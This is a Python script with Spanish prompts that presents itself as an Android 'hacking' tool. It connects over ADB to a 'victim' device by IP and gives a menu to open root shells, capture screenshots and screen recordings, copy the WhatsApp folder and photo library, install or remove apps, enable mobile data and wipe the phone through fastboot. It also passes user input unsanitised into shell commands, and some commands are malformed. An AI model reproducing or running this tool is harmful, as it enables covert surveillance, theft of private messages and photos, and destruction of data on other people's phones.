#!/usr/bin/python

import os
import time
import subprocess
from colorama import Fore, init
init()

os.system('clear')

print(Fore.RED)

banner = """
        _____   ______ _    _       _       _      
   /\  (____ \ (____  \ \  / /     | |     (_)_    
  /  \  _   \ \ ____)  ) \/ / ____ | | ___  _| |_  
 / /\ \| |   | |  __  ( )  ( |  _ \| |/ _ \| |  _) 
| |__| | |__/ /| |__)  ) /\ \| | | | | |_| | | |__ 
|______|_____/ |______/_/  \_\ ||_/|_|\___/|_|\___)
                             |_|                                                
"""

def switch():
	print(banner)
	print(Fore.GREEN)
	print("Created By Blackster")
	time.sleep(1)
	print("\nUse esta herramienta bajo su responsabilidad.")
	time.sleep(1)
	menu = """
>> 0- Conectar ADB.
>> 1- Mostrar dispositivos ADB.
>> 2- Desconectar dispositivo.

<<<<<<<<<<< Comandos Hacking >>>>>>>>>>

¡¡Antes de usar estos comandos asegurate de estar conectado al disposistivo primero(ADB)!!

>> 3- Abrir una shell del Dispositivo.
>> 4- Tomar captura de pantalla del Dispositivo.
>> 5- Grabar pantalla del Dispositivo.
>> 6- Mostrar info del sistema.
>> 7- Listar paquetes instalados.
>> 8- Instalar una apk.
>> 9- Reiniciar Dispositivo.
>> 10- Desinstalar una apk.
>> 11- Habilitar Datos moviles.
>> 12- Extraer Apk del dispositivo.
>> 13- Mostrar info sobre CPU.
>> 14- Descargar un archivo desde el dispositivo.
>> 15- Descargar la carpeta de Whatsapp.
>> 16- Descargar la carpeta de Fotos.
>> 17- Correr una aplicacion en el dispositivo.
>> 18- Formatear Dispositivo (Hard Reset).
"""
	print(Fore.CYAN)
	print(menu)


while True:
	switch()
	ask = int(input("Escoge una opcion >> "))
	if ask==0:
		print("Primero asegurate de tener la IP y el puerto correcto para conectarte al dispositivo Victima!!")
		time.sleep(2)
		print(Fore.GREEN)
		ip = str(input("\nIntroduce la IP aqui >> "))
		port = str(input("Introduce el puerto aqui >> "))
		out = (ip+':'+port)
		import subprocess
		subprocess.call(f'adb connect {out}', shell=True)
		print("Presione una tecla para Continuar...")
		input()
		os.system('clear')

	elif ask==1:
		subprocess.call('adb devices', shell=True)
		print("Presione una tecla para Continuar...")
		input()
		os.system('clear')
		print(Fore.RED)

	elif ask==2:
		ip = str(input("Introduce tu IP aqui >> "))
		disconnect = (ip+':'+"5555")
		subprocess.call(f'adb disconnect {disconnect}', shell=True)
		time.sleep(3)
		os.system('clear')
		print(Fore.RED)

	elif ask==3:
		print("Antes de Continuar")
		menu = """
		1-Modo Root(superususario)
		2-Modo Normal(Algunas limitaciones)
		"""
		print(menu)
		root = int(input("Escoge una opcion >> "))
		if root==1:
			print("Ahora se abrira una shell del dispositivo en modo Root...")
			time.sleep(3)
			subprocess.call('adb root', shell=True)
			subprocess.call('adb shell', shell=True)
			time.sleep(1)
			os.system('clear')
			print(Fore.GREEN)
		elif root==2:
			print("Se abrira una shell en modo normal...")
			time.sleep(2)
			subprocess.call('adb shell', shell=False)
			time.sleep(1)
			os.system('clear')
			print(Fore.GREEN)

	elif ask==4:
		print("Se tomara una captura de pantalla...")
		time.sleep(2)
		img = str(input("Introduce el nombre de tu imagen (ej: imagen1 ) >> "))
		ruta = str(input("Introduce tu ruta para guardar la captura >> "))
		subprocess.call(f'adb shell screencap -p /sdcard/{img}.png', shell= True)
		time.sleep(1)
		subprocess.call(f'adb pull /sdcard/{img}.png {ruta}', shell=True)
		print("Revisa la ruta para ver tu captura de pantalla")
		print("\nPresiona una tecla...")
		input()
		os.system('clear')
		print(Fore.RED)

	elif ask==5:
		seconds = int(input("Introduzca los segundos que desea Grabar la pantalla (ej: 20) >> "))
		vid = str(input("Introduce el nombre de tu video (ej: video1) >> "))
		ruta = str(input("Introduzca la ruta para guardar la grabacion >> "))
		subprocess.call(f'adb shell screenrecord --time-limit {seconds} --verbose ./sdcard/{vid}.mp4', shell=True)
		time.sleep(1)
		subprocess.call(f'adb pull ./sdcard/{vid}.mp4 {ruta}', shell=True)
		print("Revisa tu ruta para ver tu video")
		print("Presione una tecla...")
		print(Fore.MAGENTA)

	elif ask==6:
		subprocess.call('adb shell dumpsys', shell=True)
		print("Presione una tecla.")
		input()
		print(Fore.RED)

	elif ask==7:
		subprocess.call('adb shell pm list packages', shell=True)
		print("Presione una tecla.")
		input()
		os.system('clear')
		print(Fore.RED)

	elif ask==8:
		ruta = str(input("Escribe la ruta del archivo apk >> "))
		subprocess.call(f'adb install {ruta}', shell=True)
		print("\nPresione una tecla para Continuar...")
		input()
		os.system('clear')
		print(Fore.GREEN)

	elif ask==9:
		subprocess.call('adb reboot', shell=True)
		os.system('clear')
		print(Fore.YELLOW)

	elif ask==10:
		n_p_a = str(input("Introduce el nombre del paquete de la aplicaciona Desinstalar (Escribelo bien) >> "))
		subprocess.call(f'adb uninstall {n_p_a}', shell=True)
		print("Presione una tecla para Continuar...")
		input()
		os.system('clear')
		print(Fore.GREEN)

	elif ask==11:
		subprocess.call('adb shell svc data enable', shell=True)
		time.sleep(2)
		print("Los Datos Moviles han sido Activados")
		print("\nPresione una tecla...")
		input()
		os.system('clear')
		print(Fore.RED)

	elif ask==12:
		path = str(input("Introduzca aqui el nombre del paquete de la APK (ej: com.example.aplication) >> "))
		subprocess.call(f'adb shell pm path {path} /sdcard/extraction.apk', shell=True)
		time.sleep(2)
		ruta = str(input("Escriba la ruta donde desea guardar el archivo apk >> "))
		subprocess.call(f'adb pull /sdcard/extraction.apk {ruta}', shell=True)
		print("Presione una tecla para Continuar...")
		input()
		print(Fore.YELLOW)

	elif ask==13:
		subprocess.call('adb shell cat/proc/cpuinfo', shell=True)
		print("\nPresione una tecla para Continuar...")
		input()
		os.system('clear')
		print(Fore.MAGENTA)

	elif ask==14:
		print("¡¡Primero especifica la ruta del archivo o carpeta que quieres descargar del dispositivo !!")
		time.sleep(3)
		print(Fore.GREEN)
		ruta = str(input("Especifica la ruta del archivo o carpeta (ej: /sdcard/mifile.txt) >> "))
		destino = str(input("Especifique la ruta destino doonde guardara su archivo >> "))
		subprocess.call(f'adb pull {ruta} {destino}', shell=True)
		print("Verifique su archivo...")
		print("Presione una tecla para continuar...")
		input()
		os.system('clear')
		print(Fore.GREEN)

	elif ask==15:
		print("¡Advertencia! \n Se descargara la carpeta de Whatsapp en caso de que esta exista, de lo contrario no servira.")
		time.sleep(2)
		ruta = "/sdcard/WhatsApp"
		destino = str(input("Introduzca la ruta destino donde se guardara la carpeta >> "))
		subprocess.call(f'adb pull {ruta} {destino}', shell=True)
		print("Presione una tecla para continuar...")
		input()
		os.system('clear')
		print(Fore.MAGENTA)

	elif ask==16:
		print("Se descargara la carpeta de fotos\nsi no existe no funcionara")
		time.sleep(2)
		ruta = "/sdcard/DCIM"
		destino = str(input("Introduzca la ruta destino donde se guardara la carpeta >> "))
		subprocess.call(f'adb pull {ruta} {destino}', shell=True)
		print("Presione una tecla para continuar...")
		input()
		os.system('clear')
		print(Fore.RED)

	elif ask==17:
		print("Vamos a correr una app...")
		time.sleep(2)
		ruta = str(input("Introduce el nombre del paquete a ejecutar >> "))
		subprocess.call(f'adb shell monkey -p {ruta} -c android.intent.category.LAUNCHER 0', shell=True)

	elif ask==18:
		print("BAD MODE: ON")
		time.sleep(1)
		subprocess.call('adb reboot bootloader', shell=True)
		subprocess.call('fastboot devices', shell=True)
		subprocess.call('fastboot -w flashall', shell=True)
		print("\nPresione una tecla para Continuar...")
		input()
		print(Fore.RED)

	else:
		print("SYNTAX ERROR XD...\nPresione una tecla...")
		input()
		os.system('clear')
		print(Fore.GREEN)
